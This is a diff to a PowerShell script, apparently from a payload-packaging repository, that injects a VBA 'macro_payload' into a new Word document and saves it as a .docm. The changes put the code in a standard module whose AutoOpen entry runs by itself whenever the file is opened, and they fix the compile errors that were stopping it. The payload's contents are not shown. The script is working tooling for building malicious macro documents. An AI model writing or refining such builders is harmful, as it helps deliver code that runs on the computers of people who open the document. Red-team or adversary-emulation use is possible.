@@ -22,7 +22,8 @@ powershell -ExecutionPolicy Bypass -File payloads/packaging/install_macro_docm.p
 param(
     [string]$MacroSource = (Join-Path $PSScriptRoot '..\docm\macro_payload.vba'),
     [string]$OutPath = (Join-Path ([Environment]::GetFolderPath('Desktop')) 'test.docm'),
-    [switch]$SkipInject
+    [switch]$SkipInject,
+    [switch]$InjectIntoDocument   # legacy: inject into ThisDocument (collides with Document members -> keep OFF by default)
 )
 $ErrorActionPreference = 'Stop'
 
@@ -61,11 +62,12 @@ $code = Get-Content -LiteralPath $MacroSource -Raw
 # strip VB_Name attribute / any module-attribute lines (invalid via AddFromString)
 $code = $code -replace '(?m)^Attribute\s+VB_Name.*$', ''
 
-# guard: the source must define RunEntry exactly once (a duplicated block causes
-# VBA "compile error: ambiguous name detected: RunEntry")
-$runEntryCount = ([regex]::Matches($code, '(?m)^\s*(Private|Public)?\s*Sub\s+RunEntry\b')).Count
-if ($runEntryCount -ne 1) {
-    throw "macro source must define RunEntry exactly once (found $runEntryCount in $MacroSource). Re-copy macro_payload.vba from the repository and retry."
+# guard: the source must define exactly one auto-trigger entry macro - RunEntry
+# (ThisDocument flow) or AutoOpen (standard-module flow); a duplicated block
+# causes VBA "compile error: ambiguous name detected".
+$entryCount = ([regex]::Matches($code, '(?m)^\s*Public Sub (RunEntry|AutoOpen)\b')).Count
+if ($entryCount -ne 1) {
+    throw "macro source must define exactly one entry macro (Public Sub RunEntry OR Public Sub AutoOpen); found $entryCount in $MacroSource. Re-copy macro source from the repository and retry."
 }
 
 $word = New-Object -ComObject Word.Application
@@ -74,20 +76,23 @@ $word.Visible = $true
 try {
     $doc = $word.Documents.Add()
 
-    try {
-        $proj = $word.VBE.ActiveVBProject      # requires "Trust access to the VBA project object model"
-    } catch {
-        $word.Quit()
-        throw "Word blocked VBA project access (0x800A802D family). Enable: Word > Options > Trust Center > Macro Settings > 'Trust access to the VBA project object model', then re-run. Or use -SkipInject and paste the macro manually."
+    # Inject THIS DOCUMENT's own VB project (Document.VBProject). Use a STANDARD
+    # MODULE (not ThisDocument): the ThisDocument object module derives from the
+    # Document class, so injected Document_Open/AutoOpen collide with inherited
+    # members -> "Compile error: member already exists in an object module from
+    # which this object module derives" (reproduced 2026-10-02). AutoOpen in a
+    # standard module still auto-runs when the document opens (Word auto-macro).
+    $proj = $doc.VBProject
+    if ($InjectIntoDocument) {
+        $cm = $proj.VBComponents('ThisDocument').CodeModule
+        if ($cm.CountOfLines -gt 0) { $cm.DeleteLines(1, $cm.CountOfLines) }
+        $cm.AddFromString($code)
+    } else {
+        $mod = $proj.VBComponents.Add(1)   # vbext_ct_StdModule
+        $mod.Name = 'c0015Payload'
+        $cm = $mod.CodeModule
+        $cm.AddFromString($code)
     }
-
-    # Inject directly into the ThisDocument class module. Document_Open (and
-    # AutoOpen) live here; no module creation/rename involved, which avoids
-    # the "Project is unviewable" failure on the module rename step.
-    $thisDoc = $proj.VBComponents('ThisDocument')
-    $cm = $thisDoc.CodeModule
-    if ($cm.CountOfLines -gt 0) { $cm.DeleteLines(1, $cm.CountOfLines) }   # clear leftovers / prior injection
-    $cm.AddFromString($code)
 
     # SaveAs FileFormat 13 = wdFormatXMLDocumentMacroEnabled (.docm)
     $doc.SaveAs([ref]$OutPath, [ref]13)
